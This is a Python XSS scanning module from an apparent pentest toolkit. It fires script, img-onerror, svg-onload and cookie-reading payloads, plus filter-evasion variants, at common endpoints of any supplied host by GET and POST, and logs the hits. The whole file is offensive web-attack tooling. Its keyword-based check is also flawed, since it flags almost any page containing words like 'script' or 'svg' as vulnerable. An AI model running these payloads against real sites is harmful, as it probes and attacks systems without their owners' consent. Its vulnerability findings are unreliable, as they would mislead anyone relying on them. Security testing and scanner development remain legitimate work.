import requests
from urllib.parse import quote
from itertools import permutations

def execute(target):
    """
    Prueba avanzada de vulnerabilidades de Cross-Site Scripting (XSS) con técnicas de evasión.
    """
    print(f"\n[INFO] Iniciando prueba avanzada de XSS en: {target}")

    # Endpoints comunes para probar
    endpoints = ["/search", "/login", "/feedback", "/comments", "/api/test"]

    # Payloads básicos y avanzados
    base_payloads = [
        "<script>alert(1)</script>",
        "'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "';alert(document.cookie);//",
        "<iframe src='javascript:alert(`XSS`)'>",
        "<math><mi>x</mi><annotation-xml><svg><script>alert(1)</script></svg></annotation-xml></math>"
    ]

    # Generar combinaciones dinámicas de payloads
    advanced_payloads = generate_advanced_payloads(base_payloads)

    # Indicadores de vulnerabilidad
    detection_keywords = [
        "alert(", "XSS", "script", "onerror", "onload", "svg", "cookie"
    ]

    # Cabeceras avanzadas para simulaciones
    headers = {
        "User-Agent": "Mozilla/5.0 (VulnKit-XSS Advanced)",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # Almacena los resultados de vulnerabilidad
    vulnerable_endpoints = []

    # Prueba con GET y POST
    for endpoint in endpoints:
        for payload in advanced_payloads:
            # Método GET
            url = f"http://{target}{endpoint}?q={quote(payload)}"
            test_request("GET", url, headers, payload, detection_keywords, vulnerable_endpoints)

            # Método POST
            post_url = f"http://{target}{endpoint}"
            test_request("POST", post_url, headers, payload, detection_keywords, vulnerable_endpoints, data={"input": payload})

    # Imprimir resultados
    if vulnerable_endpoints:
        print("\n[RESULTADOS] Vulnerabilidades detectadas:")
        for vuln in vulnerable_endpoints:
            print(f" - Método: {vuln['method']}")
            print(f"   URL: {vuln['url']}")
            print(f"   Payload: {vuln['payload']}")
            print(f"   Respuesta: {vuln['response_preview']}")
        save_results(vulnerable_endpoints)
        return "Vulnerable a XSS"
    else:
        print("\n[INFO] No se detectaron vulnerabilidades en los endpoints probados.")
        return "No vulnerable"

def test_request(method, url, headers, payload, keywords, results, data=None):
    """
    Realiza la solicitud HTTP y verifica vulnerabilidades.
    """
    try:
        if method == "GET":
            response = requests.get(url, headers=headers, timeout=5)
        elif method == "POST":
            response = requests.post(url, headers=headers, data=data, timeout=5)

        if is_vulnerable(response, payload, keywords):
            results.append({
                "method": method,
                "url": url,
                "payload": payload,
                "response_preview": response.text[:500]
            })
            print(f"[ALERTA] XSS detectado en {url} con payload: {payload}")
    except Exception as e:
        print(f"[ERROR] Error al probar {method} en {url}: {e}")

def is_vulnerable(response, payload, keywords):
    """
    Analiza la respuesta en busca de indicadores de XSS.
    """
    if response.status_code == 200 and payload in response.text:
        return True
    for keyword in keywords:
        if keyword in response.text.lower():
            return True
    return False

def generate_advanced_payloads(base_payloads):
    """
    Genera combinaciones dinámicas de payloads avanzados para bypass.
    """
    evasions = [
        lambda p: p.replace("<script>", "<scr<script>ipt>"),  # División en etiquetas
        lambda p: p.replace("alert", "a<blink>alert</blink>"),  # Alteración visual
        lambda p: p.replace("=", "%3D"),  # Codificación de caracteres
        lambda p: f"\" onmouseover=\"{p}"  # Eventos de ratón
    ]
    advanced_payloads = base_payloads[:]
    for payload in base_payloads:
        for evasion in evasions:
            advanced_payloads.append(evasion(payload))
    return advanced_payloads

def save_results(results, filename="xss_results_advanced.log"):
    """
    Registra los resultados de las pruebas en un archivo.
    """
    with open(filename, "w") as log_file:
        for result in results:
            log_file.write(f"Método: {result['method']}\n")
            log_file.write(f"URL: {result['url']}\n")
            log_file.write(f"Payload: {result['payload']}\n")
            log_file.write(f"Vista previa:\n{result['response_preview']}\n\n")
    print(f"[INFO] Resultados guardados en {filename}")
